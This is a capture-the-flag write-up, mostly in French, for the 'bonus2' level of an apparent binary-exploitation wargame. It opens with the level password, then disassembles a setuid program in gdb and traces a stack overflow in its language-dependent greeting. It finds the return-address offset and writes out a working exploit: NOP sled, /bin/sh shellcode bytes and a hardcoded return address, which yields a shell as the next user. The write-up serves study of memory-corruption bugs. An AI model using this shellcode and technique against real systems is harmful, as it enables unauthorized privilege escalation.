# Bonus2

> login:password -> *`bonus2:579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245`*
```
:~$ su bonus2
Password:579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```
---

```
:~$ pwd
/home/user/bonus2
```

```
:~$ ls -la
total 17
dr-xr-x---+ 1 bonus2 bonus2   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 bonus2 bonus2  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 bonus2 bonus2 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 bonus3 users  5664 Mar  6  2016 bonus2
-rw-r--r--+ 1 bonus2 bonus2   65 Sep 23  2015 .pass
-rw-r--r--  1 bonus2 bonus2  675 Apr  3  2012 .profile
```

Le Home contient un binaire `bonus2` :

```
:~$ ./bonus2

:~$ ./bonus2 test

:~$ ./bonus2 test1 test2
Hello test1
```

Avec de 0 a 1 paramètre le binaire ne donne rien, mais redonne le `argv[1]` quand on lui passe 2 arguments

```
:~$ gdb bonus2
...

(gdb) disas main
Dump of assembler code for function main:
   0x08048529 <+0>:	push   %ebp
   0x0804852a <+1>:	mov    %esp,%ebp
   0x0804852c <+3>:	push   %edi
   0x0804852d <+4>:	push   %esi
   0x0804852e <+5>:	push   %ebx
   0x0804852f <+6>:	and    $0xfffffff0,%esp
   0x08048532 <+9>:	sub    $0xa0,%esp
   0x08048538 <+15>:	cmpl   $0x3,0x8(%ebp)
   0x0804853c <+19>:	je     0x8048548 <main+31>
   0x0804853e <+21>:	mov    $0x1,%eax
   0x08048543 <+26>:	jmp    0x8048630 <main+263>
   0x08048548 <+31>:	lea    0x50(%esp),%ebx
   0x0804854c <+35>:	mov    $0x0,%eax
   0x08048551 <+40>:	mov    $0x13,%edx
   0x08048556 <+45>:	mov    %ebx,%edi
   0x08048558 <+47>:	mov    %edx,%ecx
   0x0804855a <+49>:	rep stos %eax,%es:(%edi)
   0x0804855c <+51>:	mov    0xc(%ebp),%eax
   0x0804855f <+54>:	add    $0x4,%eax
   0x08048562 <+57>:	mov    (%eax),%eax
   0x08048564 <+59>:	movl   $0x28,0x8(%esp)
   0x0804856c <+67>:	mov    %eax,0x4(%esp)
   0x08048570 <+71>:	lea    0x50(%esp),%eax
   0x08048574 <+75>:	mov    %eax,(%esp)
   0x08048577 <+78>:	call   0x80483c0 <strncpy@plt>
   0x0804857c <+83>:	mov    0xc(%ebp),%eax
   0x0804857f <+86>:	add    $0x8,%eax
   0x08048582 <+89>:	mov    (%eax),%eax
   0x08048584 <+91>:	movl   $0x20,0x8(%esp)
   0x0804858c <+99>:	mov    %eax,0x4(%esp)
   0x08048590 <+103>:	lea    0x50(%esp),%eax
   0x08048594 <+107>:	add    $0x28,%eax
   0x08048597 <+110>:	mov    %eax,(%esp)
   0x0804859a <+113>:	call   0x80483c0 <strncpy@plt>
   0x0804859f <+118>:	movl   $0x8048738,(%esp)
   0x080485a6 <+125>:	call   0x8048380 <getenv@plt>
   0x080485ab <+130>:	mov    %eax,0x9c(%esp)
   0x080485b2 <+137>:	cmpl   $0x0,0x9c(%esp)
   0x080485ba <+145>:	je     0x8048618 <main+239>
   0x080485bc <+147>:	movl   $0x2,0x8(%esp)
   0x080485c4 <+155>:	movl   $0x804873d,0x4(%esp)
   0x080485cc <+163>:	mov    0x9c(%esp),%eax
   0x080485d3 <+170>:	mov    %eax,(%esp)
   0x080485d6 <+173>:	call   0x8048360 <memcmp@plt>
   0x080485db <+178>:	test   %eax,%eax
   0x080485dd <+180>:	jne    0x80485eb <main+194>
   0x080485df <+182>:	movl   $0x1,0x8049988
   0x080485e9 <+192>:	jmp    0x8048618 <main+239>
   0x080485eb <+194>:	movl   $0x2,0x8(%esp)
   0x080485f3 <+202>:	movl   $0x8048740,0x4(%esp)
   0x080485fb <+210>:	mov    0x9c(%esp),%eax
   0x08048602 <+217>:	mov    %eax,(%esp)
   0x08048605 <+220>:	call   0x8048360 <memcmp@plt>
   0x0804860a <+225>:	test   %eax,%eax
   0x0804860c <+227>:	jne    0x8048618 <main+239>
   0x0804860e <+229>:	movl   $0x2,0x8049988
   0x08048618 <+239>:	mov    %esp,%edx
   0x0804861a <+241>:	lea    0x50(%esp),%ebx
   0x0804861e <+245>:	mov    $0x13,%eax
   0x08048623 <+250>:	mov    %edx,%edi
   0x08048625 <+252>:	mov    %ebx,%esi
   0x08048627 <+254>:	mov    %eax,%ecx
   0x08048629 <+256>:	rep movsl %ds:(%esi),%es:(%edi)
   0x0804862b <+258>:	call   0x8048484 <greetuser>
   0x08048630 <+263>:	lea    -0xc(%ebp),%esp
   0x08048633 <+266>:	pop    %ebx
   0x08048634 <+267>:	pop    %esi
   0x08048635 <+268>:	pop    %edi
   0x08048636 <+269>:	pop    %ebp
   0x08048637 <+270>:	ret    
End of assembler dump.
```

On remarque plusieurs éléments:
- une variable globale = 0
- un buffer d'au moins 72 (0x28 + 0x20)
- `strncpy()` (+78)
- `strncpy()` (+113)
- `` LANG env
- 2 `memcmp()` (+173 et +220) permettant de modifier la variable globale en fonction de la variable d'environnement


```
(gdb) disas greetuser
Dump of assembler code for function main:
```

```
   0x0804848a <+6>:        mov    eax,ds:0x8049988 // 'language'
   0x0804848f <+11>:    cmp    eax,0x1
   0x08048492 <+14>:    je     0x80484ba <greetuser+54>
   0x08048494 <+16>:    cmp    eax,0x2
   0x08048497 <+19>:    je     0x80484e9 <greetuser+101>
   0x08048499 <+21>:    test   eax,eax
   0x0804849b <+23>:    jne    0x804850a <greetuser+134>
```

```
(gdb) x/s 0x8048710 // 
0x8048710:     "Hello "
(gdb) x/s 0x804872a
0x804872a:     "Goedemiddag! "
(gdb) x/s 0x8048717
0x8048717:     "Hyv\303\244\303\244 p\303\244iv\303\244\303\244 "
(gdb) x/s 0x8048717
0x8048717:     "Hyv\303\244\303\244 p\303\244iv\303\244\303\244 "
```



On remarque aussi une fonction `greetuser()`:
- un buffer de 72 (0x48)
- (+11) cmp 1 => `strcpy()` buffer dans "Hyv\xc3\xa4\xc3\xa4 p\xc3\xa4iv\xc3\xa4\xc3\xa4 "
- (+11) cmp 2 => `strcpy()` buffer dans "Goedemiddag! "
- (+11) cmp 0 => `strcpy()` buffer dans "Hello "









we test to fill 0x28(40) + 0x20(32) = 72 to understand what happend in the memory we set breakpoint in <+152> greetuser we run the program with 'B' * 40 'A'*32

(gdb) x/100wx $esp
0xbffff5a0:	0xbffff5b0	0xbffff600	0x00000001	0x00000000
0xbffff5b0:	0x6c6c6548	0x4242206f	0x42424242	0x42424242
0xbffff5c0:	0x42424242	0x42424242	0x42424242	0x42424242
0xbffff5d0:	0x42424242	0x42424242	0x42424242	0x41414242
0xbffff5e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff5f0:	0x41414141	0x41414141	0x41414141	0x08004141
(gdb) x/x $ebp+0x4
0xbffff5fc:	0x08004141  we change the return address
so lets change the language and do the same test

0xbffff5a0:	0xbffff5b0	0xbffff600	0x00000001	0x00000000
0xbffff5b0:	0xc3767948	0x20a4c3a4	0x69a4c370	0xc3a4c376
0xbffff5c0:	0x424220a4	0x42424242	0x42424242	0x42424242
0xbffff5d0:	0x42424242	0x42424242	0x42424242	0x42424242
0xbffff5e0:	0x42424242	0x42424242	0x41414242	0x41414141
0xbffff5f0:	0x41414141	0x41414141 |0x41414141|	0x41414141

the value selected is the return address
so in this case we just need to calculate the offset and add shellcode in the begining and change the return address

i used this website to calculate the offset
https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/

Hyvää päivää BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab

Program received signal SIGSEGV, Segmentation fault.
0x41366141 in ?? ()
(gdb)
bonus2@RainFall:~$ python -c "print 'B' * 18 + '\xc8\xf5\xff\xbf' + 'B' *30" > b
bonus2@RainFall:~$ python -c "print '\x90' * 6 + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + 'A' * 30" > a
bonus2@RainFall:~$ ./bonus2 `cat a` `cat b`
Hyvää päivää ������j
                    X�Rh//shh/bin��1�̀AAAAAAAAAAAAABBBBBBBBBBBBBBBBBB����BBBBBBBBBB
$ whoami
bonus3
$